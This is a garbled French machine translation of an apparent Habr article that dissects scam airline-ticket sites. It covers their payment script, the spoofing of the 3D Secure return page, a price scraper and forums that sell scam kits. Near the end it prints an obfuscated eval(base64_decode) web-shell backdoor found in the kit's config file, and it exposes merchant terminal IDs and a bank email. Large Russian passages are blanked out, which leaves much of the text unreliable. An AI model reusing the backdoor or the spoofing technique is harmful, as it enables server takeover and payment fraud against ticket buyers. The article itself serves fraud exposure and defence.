<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'ai essayÃ© d'effectuer un paiement en utilisant le script alternatif payment.php et le paiement a rÃ©ussi la premiÃ¨re fois.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La seule chose que la confirmation du paiement a Ã©tÃ© affichÃ©e sur le site Web 3ds.payment.ru. </font><font style="vertical-align: inherit;">J'ai dÃ©cidÃ© que puisque ce script fonctionne, il sera possible de trouver la raison pour laquelle le premier script de la description (payp2p.php) ne fonctionne pas.</font></font><br>
<br>
<img src="https://habrastorage.org/files/113/941/882/1139418821c64ae4a67cdefba3b3fd59.png"><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code de script complet payment.php sous le spoiler</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/c65/c1f/56d/c65c1f56d0fe4e8c895bfbcd98109349.png"><br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description des diffÃ©rences entre les scripts payment.php et payp2p.php</font></font></b><div class="spoiler_text">     .    .<br>
<br>
 payp2p.php       POST  .  payment.php     GET    .  ,      ,       :<br>
<br>
<code>https://p2p.localhost/payment.php?card_1=1111&amp;card_2=2222...&amp;cvc=999...&amp;price=30... </code><br>
<br>
    ,         Â« Â».<br>
<br>
Payment.php    payp2p.php       MySQL.        .       .<br>
<br>
Payment.php      .        ,     .   ,  payp2p.php    ,   ,  payment.php      . TERMINAL=24043210, MERCH_NAME=PSB, MERCHANT=000601224043202, EMAIL=lakhtin%40psbank.ru, TRTYPE=8 (    TRTYPE    .   payp2p.php  ).<br>
<br>
  â€” payment.php         <code>https://3ds.payment.ru/cgi-bin/is_3DS</code>.          <code>{"IS_ACTIVE":"Y"}</code>      ,        (   3D Secure).<br>
<br>
    .      payment.php     .  ,        3ds.payment.ru.<br>
</div></div><br>
<blockquote>  â€¦  ,       Firefox,  Â«Â»  payment.php      (Â«Firefox/3.0.3Â»),  ,          , ,           . ,  3.5 Firefox    2009 ,  4 Firefox     2011,      payp2p.php ,  Â«Firefox/38.0Â»,      2016  â€” Firefox 49.</blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, il y a eu des tentatives pour corriger le script payp2p.php qui ne fonctionnait pas pour une raison quelconque, pour le corriger, en prenant le script de travail comme base. Diverses options ont Ã©tÃ© essayÃ©es. Tous les morceaux de code qui pourraient affecter le travail Ã  leur tour ont Ã©tÃ© transfÃ©rÃ©s du script de travail vers le script non fonctionnel. Entre autres choses, il y a eu une tentative de connexion intermÃ©diaire supplÃ©mentaire Ã  </font></font><code>https://3ds.payment.ru/cgi-bin/is_3DS</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; changer, allumer et Ã©teindre les options cURL, etc. Rien n'a aidÃ©, la fleur de pierre n'est pas sortie. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Plus tard, lors des tests, il a Ã©tÃ© dÃ©cidÃ© de dÃ©sactiver les redirections au stade final dans payp2p.php. AprÃ¨s cela, il est devenu possible de lire le message d'erreur de Promsvyazbank. Capture d'Ã©cran de l'erreur ci-dessous. Dans le navigateur aprÃ¨s une tentative infructueuse d'effectuer un paiement, une autre page s'affiche, mais si vous cliquez sur Â«RetourÂ» une ou plusieurs fois, vous pouvez voir cette page.</font></font><br>
<br>
<img src="https://habrastorage.org/files/11f/86c/ecd/11f86cecd02b46828d04419e18f8354b.png"><br>
<blockquote>: <br>
<br>
,         . <br>
<br>
  : /   (/)<br>
,       ,    / </blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il existe certaines restrictions sur le nombre de paiements d'une carte par jour sur le site Web de Promsvyazyazbank, etc. Bien que je n'aie pas dÃ©passÃ© les limites du nombre de paiements rÃ©els, il est possible que les paiements n'aient pas Ã©tÃ© effectuÃ©s Ã  un moment donnÃ©, en raison du grand nombre de mes tentatives. (Pour capturer les valeurs des variables pendant le dÃ©bogage, j'ai commencÃ© le processus de paiement plusieurs fois, mais je ne l'ai pas terminÃ©) Je ne connais pas la raison exacte de ce message. Chaque tentative de payer ORDER_NUM et TIMESTAMP en utilise une nouvelle. Ils n'auraient pas dÃ» influencer l'apparition d'une telle erreur. Bien que la carte que j'ai utilisÃ©e pour le paiement, un paiement rÃ©ussi soit passÃ© par un script alternatif de payment.php, peut-Ãªtre que la carte de l'expÃ©diteur ou du destinataire est entrÃ©e dans la liste d'arrÃªt.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le script payp2p.php ressemblait dÃ©jÃ  un peu Ã  son Ã©tat d'origine. J'ai moi-mÃªme commencÃ© Ã  confondre ce que j'y ai remplacÃ© et ce qui ne l'a pas Ã©tÃ©. Par consÃ©quent, je l'ai renvoyÃ© Ã  sa forme d'origine, sauf que sur les derniÃ¨res lignes, la redirection de la redirection vers la page de paiement rÃ©ussie a Ã©tÃ© dÃ©sactivÃ©e. Les numÃ©ros de carte de l'expÃ©diteur et du destinataire pour les tentatives suivantes ont Ã©tÃ© utilisÃ©s Ã  nouveau. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Enfin, avec l'aide de payp2p.php, il s'est avÃ©rÃ© que le paiement Ã©tait rÃ©ussi. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9cd/606/539/9cd60653958e4dda9fa38ef0e9826092.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Faites attention Ã  la signature dans la ligne "Description". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
AprÃ¨s avoir saisi le code de confirmation 3D Secure, le retour s'effectue sur la page Promsvyazbak: </font></font><br>
<br>
<img src="https://habrastorage.org/files/fed/cb7/370/fedcb7370bcb4995a20a9a7218c6bdbc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
SMS reÃ§u. Ã€ gauche de la banque de l'expÃ©diteur. Ã€ droite de la banque du bÃ©nÃ©ficiaire. </font></font><br>
<br>
<img src="https://habrastorage.org/files/463/935/875/46393587535a428384fc62522d5154ff.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sberbank, pour une raison quelconque, indiquÃ© dans l'heure SMS GMT. Auparavant, je ne l'avais pas remarquÃ© dans les messages de cette banque.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Avec la substitution de la page de retour dÃ©sactivÃ©e, rÃ©pÃ©tez le paiement rÃ©ussi en utilisant le script payp2.php s'est avÃ©rÃ© plusieurs fois. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai essayÃ© de payer avec d'autres cartes. Chaque banque Ã©met son formulaire 3D Secure. Mais cela ne change pas l'essence. </font></font><br>
<br>
<img src="https://habrastorage.org/files/452/684/b75/452684b75ede43deaca4c3c448d77bf5.png"><br>
<br>
<img src="https://habrastorage.org/files/671/19c/d9f/67119cd9f13b4b1b92c43903c4a5a466.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veuillez noter que toutes les banques n'incluent pas de Â«description supplÃ©mentaireÂ» dans leur formulaire de confirmation. Dans notre exemple, Â«ticket payÂ».</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il n'est pas nÃ©cessaire de s'adapter Ã  la page de chaque banque. Bien que les formes soient diffÃ©rentes, le mÃ©canisme de leur substitution est le mÃªme. Tout formulaire aprÃ¨s paiement contient un lien avec l'adresse de la page sur laquelle vous souhaitez revenir. Les banques elles-mÃªmes, qui fournissent des formulaires de vÃ©rification 3D Secure, ne seront probablement pas renvoyÃ©es sur le Â«site de gaucheÂ». Certes, il existe certaines rÃ¨gles et les banques du formulaire de vÃ©rification 3DS devraient au moins revenir au mÃªme domaine Ã  partir duquel la demande de paiement a Ã©tÃ© reÃ§ue. (Dans notre cas, Ã  3ds.payment.ru). La banque vÃ©rifiant le code 3D Secure, dans le cas oÃ¹ le mot de passe est saisi correctement, dans le code html de la page indique l'adresse Ã  laquelle il faut retourner, mais elle ne peut plus contrÃ´ler s'il devait revenir sur cette page.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ã€ la suite de toutes les expÃ©riences, il a Ã©tÃ© possible d'obtenir le script payp2p.php pour payer via le service de transfert de carte Ã  carte de Promsvyazbank 3ds.payment.ru. En mÃªme temps, j'ai dÃ» dÃ©sactiver la substitution de l'adresse de retour sur les derniÃ¨res lignes du script. Lorsque vous activez l'usurpation d'adresse de la page de retour, comme c'Ã©tait le cas dans le script d'origine, Ã  l'heure actuelle, l'argent ne passe vraiment pas. La page de vÃ©rification 3D Secure s'affiche. Un SMS avec "mot de passe" est envoyÃ©; le formulaire de vÃ©rification ne passe pas Ã  l'Ã©tape suivante lors de la saisie du mauvais mot de passe; aprÃ¨s avoir entrÃ© le "mot de passe" correct, redirige vers une fausse page, mais l'argent ne passe pas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La falsification de l'adresse de la page de retour pour un paiement rÃ©ussi est une partie trÃ¨s importante pour les sites frauduleux. Si l 'Â«acheteur de billetsÂ» ne soupÃ§onne pas qu'il a Ã©tÃ© trompÃ©, il peut payer non pas un, mais plusieurs achats de billets et aprÃ¨s cela pendant longtemps (jours et semaines), ne pas prendre de mesures actives pour annuler le paiement, etc. Si l'acheteur aprÃ¨s avoir "payÃ© les billets d'avion" reÃ§oit une confirmation du transfert de carte Ã  carte, il est fort probable qu'il n'effectuera plus les paiements suivants, il contactera sa banque et, Ã©ventuellement, la police beaucoup plus rapidement. Cela signifie que les flux de trÃ©sorerie sur les sites frauduleux sont rÃ©duits, la probabilitÃ© d'annuler les paiements passÃ©s augmente, les organismes d'application de la loi et les employÃ©s d'hÃ©bergement commencent Ã  agir plus tÃ´t, et la probabilitÃ© de ne pas avoir le temps de retirer des fonds volÃ©s dans un endroit sÃ»r augmente.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le fait que ce script ait Ã©tÃ© utilisÃ© sur un site frauduleux de combat, je n'en doute pas. J'ai des raisons de croire que cela a fonctionnÃ© sous la forme sous laquelle il m'a Ã©tÃ© fourni. Actuellement, cela fonctionne de maniÃ¨re limitÃ©e (pas de redirection).</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Environ trois semaines aprÃ¨s la publication de la premiÃ¨re partie de la publication, qui mentionnait les fraudeurs utilisant le service de transfert de carte Ã  carte de Promsvyazbank, cette banque a apportÃ© quelques modifications Ã  son service, ce que je considÃ¨re important. Plus tÃ´t, lors du paiement via le site Web de Promsvyazbank, les payeurs ont reÃ§u des SMS incomprÃ©hensibles avec le texte Â«P2P PSBANKÂ», mais maintenant ils ont commencÃ© Ã  recevoir des SMS avec le texte Â«CARD2CARD PSBANK.RUÂ». MÃªme ainsi, Ã  premiÃ¨re vue, un lÃ©ger changement dans le dÃ©cryptage de la finalitÃ© du paiement suffit Ã  certaines victimes potentielles de fraudeurs pour annuler le paiement au stade de la confirmation. Je pense que ce n'est pas une coÃ¯ncidence, et les changements ont Ã©tÃ© apportÃ©s prÃ©cisÃ©ment Ã  la suite de la publication de l'article sur GeekTimes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il est probable qu'aprÃ¨s la publication de la premiÃ¨re partie de l'article, en plus de modifier le texte de confirmation dans SMS, des ajustements supplÃ©mentaires pourraient Ãªtre apportÃ©s aux algorithmes du service de transfert de carte Ã  carte de Promsvyazbank. </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Je ne peux pas dire 100%, mais mon avis est qu'avant le service de Promsvyazbank 3ds.payment.ru avec une forte probabilitÃ© n'a pas vÃ©rifiÃ© le retour des utilisateurs sur leur site aprÃ¨s avoir rÃ©ussi Ã  entrer le code 3D Secure sur les sites des banques Ã©mettant des cartes de paiement. Par consÃ©quent, les paiements ont Ã©tÃ© effectuÃ©s mÃªme lorsque des scripts frauduleux ont changÃ© la page de retour.</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La banque, mentionnÃ©e Ã  plusieurs reprises dans cette publication, a eu de la chance avec la publicitÃ© gratuite. Je pense qu'en rÃ©alitÃ©, il existe encore un nombre suffisant de ces banques. C'est juste que c'est plus heureux car il a Ã©tÃ© choisi d'abord pour une utilisation sur des sites frauduleux, puis pour l'analyse dans cet article. Comme on dit, il n'y a pas de patients en bonne santÃ©, il y a des patients mal examinÃ©s. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lors de la rÃ©daction de cet article, la tÃ¢che de crÃ©er un script frauduleux de combat n'en valait pas la peine. La tÃ¢che Ã©tait d'essayer de comprendre comment cela fonctionnait ou fonctionnait afin de comprendre les raisons pour lesquelles les Â«acheteurs de billets d'avionÂ» pouvaient Ãªtre trompÃ©s, et d'en tirer des conclusions.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cet article soulÃ¨ve de nombreuses questions, mais ne fournit pas toutes les rÃ©ponses. </font><font style="vertical-align: inherit;">Je suis sÃ»r que parmi les lecteurs, il y aura un nombre suffisant d'utilisateurs avancÃ©s qui pourront commenter plus prÃ©cisÃ©ment le tableau clinique et poser un diagnostic. </font><font style="vertical-align: inherit;">Pour ma part, j'ai essayÃ© de prÃ©senter le tÃ©moignage le plus complÃ¨tement possible ... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Une partie de la publication avec l'analyse du script de paiement est terminÃ©e. </font><font style="vertical-align: inherit;">D'autres bonus pour ceux qui ont pu lire Ã  cet endroit.</font></font><br>
<hr><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D'oÃ¹ viennent les billets d'avion bon marchÃ© sur les sites frauduleux? </font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans la partie prÃ©cÃ©dente de la publication, par des signes indirects, il a Ã©tÃ© montrÃ© que des informations sur la disponibilitÃ© des places et des prix sont obtenues par programmation sur un site honnÃªte, modifiÃ©es et diffusÃ©es Ã  l'utilisateur.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations sur la disponibilitÃ© et les prix sur un site frauduleux</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7a5/1e4/8a8/7a51e48a8a3d4d8aabb8ea4acdbd053e.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons maintenant la possibilitÃ© de regarder dans les coulisses et de voir comment cela est implÃ©mentÃ© dans le code du programme. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voici l'endroit dans le code du site frauduleux dans lequel nous voyons d'oÃ¹ proviennent les photos et les prix des vols des sites frauduleux. </font></font><br>
<br>
<img src="https://habrastorage.org/files/e65/0c5/25b/e650c525b0424acf861678766f7eb75c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme prÃ©vu dans cette sÃ©rie de sites frauduleux, les informations sur les lieux disponibles sont prises sur un site honnÃªte </font></font><code>www.aviacassa.ru</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Ã‰tant donnÃ© que le nombre de compagnies aÃ©riennes et de vols est important, il est trÃ¨s difficile de tÃ©lÃ©charger Ã  l'avance toutes les images et les icÃ´nes d'un tel problÃ¨me, les liens vers ces images sont laissÃ©s directement sur le site d'origine. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La remise est dÃ©duite du prix d'origine reÃ§u pour les billets d'avion. Comme indiquÃ© prÃ©cÃ©demment, le propriÃ©taire d'un site frauduleux peut fixer arbitrairement le montant de la remise. Le montant de la remise est stockÃ© dans le fichier aviacfg.php.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Un morceau de code plus complet chargÃ© d'obtenir des informations sur la disponibilitÃ© des siÃ¨ges, de prÃ©parer des liens vers des images et de modifier les prix sous le spoiler.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Analyseur de prix - une partie plus complÃ¨te du code</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/cf0/e74/617/cf0e7461727a4415bf018283c1cdf15c.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous ne dÃ©monterons pas cette piÃ¨ce ligne par ligne, car ce n'est pas le code lui-mÃªme qui est important, mais l'idÃ©e de savoir comment et d'oÃ¹ proviennent les donnÃ©es rÃ©elles des billets d'avion pour les sites frauduleux. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'ancien analyseur utilisait un autre site pour obtenir des donnÃ©es: </font></font><br>
<br>
<img src="https://habrastorage.org/files/e7e/625/9d8/e7e6259d8cc84a1586e61e7005ac6d3f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Astuce pour la billetterie </font></font><code>(www.aviacassa.ru)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- vous devez fermer la possibilitÃ© de liens vers des fichiers de domaine Ã  partir d'un rÃ©fÃ©rent externe (site rÃ©fÃ©rent). </font><font style="vertical-align: inherit;">Cette opportunitÃ© peut Ãªtre fermÃ©e Ã  tout le monde sans exception, ou vous pouvez faire des exceptions uniquement pour les partenaires de confiance. </font><font style="vertical-align: inherit;">Le serveur Web NGINX, qui utilise aviacassa, rend cela facile Ã  faire. </font><font style="vertical-align: inherit;">La mÃªme recommandation pour tous les sites similaires pouvant Ãªtre utilisÃ©s comme Â«donneurs d'informationsÂ».</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si des sites frauduleux ne peuvent pas crÃ©er de lien direct vers des images sur des sites tels que les guichets, cela compliquera leur vie. Le nombre de logos et d'images de diffÃ©rentes compagnies aÃ©riennes n'est pas connu Ã  l'avance. MÃªme si vous essayez de tÃ©lÃ©charger les images Ã  l'avance, vous pouvez ignorer quelque chose et le site frauduleux sera laid. Ces sites seront obligÃ©s de tÃ©lÃ©charger toutes les images localement sur le serveur Ã  chaque demande, ou au moins de vÃ©rifier si une telle image a dÃ©jÃ  Ã©tÃ© tÃ©lÃ©chargÃ©e dans le "cache" ou non. Cela augmente la charge sur le serveur frauduleux et ralentit le rendu des pages. En outre, la suppression de la possibilitÃ© de crÃ©er un lien direct vers des images en mÃªme temps rendra inopÃ©rants tous les sites frauduleux actuels qui utilisent les informations de la billetterie.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bien sÃ»r, au fil du temps, les dÃ©veloppeurs feront des correctifs. </font><font style="vertical-align: inherit;">Mais comme les sites frauduleux ne sont pas gÃ©rÃ©s de maniÃ¨re centralisÃ©e et que diverses personnes ne disposent pas de mises Ã  jour logicielles automatiques, chaque propriÃ©taire d'un site frauduleux devra rechercher une opportunitÃ© de mise Ã  niveau. </font><font style="vertical-align: inherit;">Quelqu'un trouvera le code mis Ã  jour, mais personne ne le trouvera et le site cessera de fonctionner. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En outre, la billetterie peut inclure un journal distinct pour ces images, dans lequel les enregistrements de tous les rÃ©fÃ©rents externes (sites rÃ©fÃ©rents) seront enregistrÃ©s. </font><font style="vertical-align: inherit;">Et en quelques jours dans ce journal, vous obtiendrez une liste de tous les sites frauduleux actifs. </font><font style="vertical-align: inherit;">C'est trÃ¨s pratique - au lieu d'essayer de trouver individuellement chaque site, vous pouvez leur demander de s'inscrire indÃ©pendamment dans la liste (fichier journal).</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Et s'il y a des administrateurs amusants Ã  la billetterie, vous pouvez faire une blague ...</font></font></b><div class="spoiler_text"> - NGINX           ,    ,  Â«Â»        ,         URL ,   .     .   â€”   Â« Â»   ,        -, ,  ,       ,     .</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quelqu'un peut dire que la publication de tels articles sert d'outil de formation aux escrocs et poser une question, pourquoi l'ai-je affichÃ© ici? Je rÃ©ponds. S'il existe un moyen de voler de l'argent, basÃ© sur l'utilisation de logiciels vulnÃ©rables ou insuffisamment protÃ©gÃ©s, dont au moins quelques personnes sont au courant et que leur objectif est de gagner de l'argent dessus, alors une tentative de cacher ces informations et de prÃ©tendre qu'il n'y a pas de problÃ¨me ne mÃ¨ne qu'Ã  consÃ©quences encore pires. Les fraudeurs utilisent ces mÃ©thodes encore plus activement, tandis que les banques sont heureuses car elles paient rÃ©guliÃ¨rement la commission pour les services et leur volent de l'argent. Pourquoi les banques doivent-elles changer quelque chose, si tout va si bien? De temps en temps, seuls certains internautes sont trompÃ©s et perdent de l'argent sur des sites frauduleux. Mais qui s'en soucie?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mon opinion est que si une opportunitÃ© Â«dÃ©licateÂ» de voler de l'argent devient connue d'un trÃ¨s grand nombre de personnes, il devient avec le temps beaucoup plus difficile pour les fraudeurs de l'utiliser, et il devient impossible pour les organisations qui l'utilisent d'ignorer les problÃ¨mes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le script payp2.php et un certain nombre de fichiers utilisÃ©s sur une rÃ©cente sÃ©rie de sites de vente frauduleux de compagnies aÃ©riennes m'ont Ã©tÃ© envoyÃ©s par l'utilisateur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">freezstorm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Je ne sais pas oÃ¹ il l'a obtenu - posez-lui directement toutes les questions Ã  ce sujet.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais je peux immÃ©diatement dire que, comme il sâ€™est avÃ©rÃ© plus tard, il nâ€™est pas difficile de trouver lâ€™ensemble complet des codes source pour les sites frauduleux vendant des billets dâ€™avion. </font><font style="vertical-align: inherit;">Recherche de "faux vols". </font><font style="vertical-align: inherit;">Les deux principaux moteurs de recherche fournissent des liens sur la premiÃ¨re page. </font><font style="vertical-align: inherit;">Un ensemble complet de codes sources ne coÃ»te que 25 Ã  30 tonnes de roubles. </font><font style="vertical-align: inherit;">AprÃ¨s que ce sujet a cessÃ© de fonctionner, les codes sources non fonctionnels, qui, selon le vendeur, sont Â«faciles Ã  terminerÂ», ont commencÃ© Ã  coÃ»ter 10tr. </font><font style="vertical-align: inherit;">RÃ©cemment, Ã  en juger par les messages sur les forums, la version 2.0 serait Ã  nouveau en vente au prix de 25tr. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous trouverez ci-dessous un exemple de spoiler de vente gratuite du code source d'un site Web frauduleux pour la vente de billets d'avion sur l'un des forums.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Capture d'Ã©cran du forum. </font><font style="vertical-align: inherit;">(Neat, trÃ¨s longues photos)</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7bc/69f/693/7bc69f6935294a76ba54c22e6fc2376f.jpg"><br>
<div class="spoiler"><b class="spoiler_title"> .  (2/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/823/4a0/f64/8234a0f641be4ef1a1acfe4fe4c8c7b4.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (3/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/147/0d7/d85/1470d7d857c2462c9a8948a64348d13e.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (4/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/743/5ad/aef/7435adaef04748b987b38b5cac75590a.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (5/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/1a1/519/eb6/1a1519eb638949be87239514e44edec9.jpg"><br>
</div></div><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sur le forum, qui est illustrÃ© dans la capture d'Ã©cran, les codes de sites Web frauduleux similaires, les informations de carte de crÃ©dit, les donnÃ©es de passeport, les informations personnelles des bases de donnÃ©es d'Ã‰tat sont ouvertement vendus et achetÃ©s, il est proposÃ© de fabriquer de faux passeports, permis de conduire, etc. Ce n'est qu'une courte liste par exemple. C'est-Ã -dire Ã  de rares exceptions prÃ¨s, le crime est continu. Dans le mÃªme temps, l'administration du forum agit en tant que garant entre acheteurs et vendeurs. Il existe plusieurs forums comme celui-ci. Ils travaillent tous librement pendant des annÃ©es. Tous sont parfaitement indexÃ©s par les moteurs de recherche (Yandex, Google, etc.). Je ne cite pas l'adresse d'un forum spÃ©cifique. Ils sont trÃ¨s faciles Ã  trouver.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ã‰tant donnÃ© que derriÃ¨re chaque site Web frauduleux pour la vente de billets d'avion, il y a une personne distincte qui a achetÃ© le code source du site Web Ã  peu de frais, dans chaque cas, vous pouvez trouver la personne responsable et cela doit Ãªtre fait. Tous les administrateurs d'un tel faux site ne sont pas des super professionnels dont les traces sont introuvables. Je suis sÃ»r que parmi ces administrateurs, il y en a suffisamment qui ont hÃ©ritÃ© et, s'ils ont l'autoritÃ© appropriÃ©e, peuvent Ãªtre calculÃ©s. Mais, Ã  mon avis, au lieu d'essayer de traiter chaque faux site individuellement, vous devriez faire attention aux sites oÃ¹ les sources de ces faux sites sont librement distribuÃ©es.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Afin de porter un coup fatal aux sites frauduleux vendant de faux billets d'avion, vous n'en avez pas tellement besoin. Si tout le monde fait un peu, cela compliquera grandement la vie des fraudeurs et pourrait poser la question de l'inefficacitÃ© de la conduite d'une telle entreprise. Il faut un peu d'attention de la part des moteurs de recherche - pour empÃªcher ces sites de faire de la publicitÃ©. Il est irrÃ©aliste de classer ces sites dans les meilleurs rÃ©sultats sans publicitÃ©. En outre, les moteurs de recherche devraient exclure les sites qui achÃ¨tent et vendent des programmes criminels. Il faut un peu d'attention aux banques pour garder une trace de leurs services de paiement afin que les fraudeurs ne puissent pas facilement les utiliser. Besoin d'un peu d'attention de la part des hÃ©bergeurs. Vous avez besoin d'un peu d'attention de la part des systÃ¨mes de paiement - pour commencer, n'autorisez pas les paiements sans vÃ©rifier 3D Secure (comme indiquÃ© dans la premiÃ¨re partie de la publication,c'est encore possible). Besoin d'une certaine attention de l'application des lois. Au lieu d'enquÃªter sur chaque cas de vol d'argent, il est plus efficace d'agir Ã  l'avance - traiter le nid oÃ¹ les escrocs communiquent (analyser, par exemple, ces forums trÃ¨s fantÃ´mes). Et bien sÃ»r, vous avez besoin d'un peu d'attention de la part des acheteurs potentiels de billets d'avion eux-mÃªmes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ils disent que les rÃ©parations ne peuvent pas Ãªtre terminÃ©es et qu'elles peuvent seulement Ãªtre arrÃªtÃ©es. </font><font style="vertical-align: inherit;">Cette publication est un cas similaire. </font><font style="vertical-align: inherit;">Par consÃ©quent, bien que beaucoup plus puisse Ãªtre Ã©crit, je m'arrÃªterai ici. </font><font style="vertical-align: inherit;">Merci de votre attention. </font><font style="vertical-align: inherit;">Je serai heureux de vos commentaires.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS A propos de Jackie Chan ... Vous ne pouvez pas lire</font></font></b><div class="spoiler_text">      ,       ,           ,    ,      .<br>
<br>
          ,       , ,   ,     - .      .        .<br>
<br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">   fon.png.    ,   ,  .    (merch)    .    .<br>
<br>
           . , -      ,    .    .        .<br>
<img src="https://habrastorage.org/files/d79/ff7/9c4/d79ff79c458d4bd9ad5c15987f410a8b.png"><br>
<br>
         VISA  Mastercard     (logo_standart_ru.png):<br>
<br>
<img src="https://habrastorage.org/files/596/f44/183/596f4418373846908dcede64835821c4.png"><br>
<br>
    .   , .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">       parser.php</b><div class="spoiler_text"><img src="https://habrastorage.org/files/0a9/dd4/b36/0a9dd4b36e6b45ed9aa6f5584dc2adec.png"><br>
<br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text">    ,   ,   ,    - . ,    -,      Â«Â» .  (config.php)     ,  .                .     .     .          .<br>
<br>
<img src="https://habrastorage.org/files/65d/4e6/484/65d4e6484eca40468fdab34568130804.png"><br>
<br>
<pre><code class="php hljs"><span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,<font></font>
<font></font>
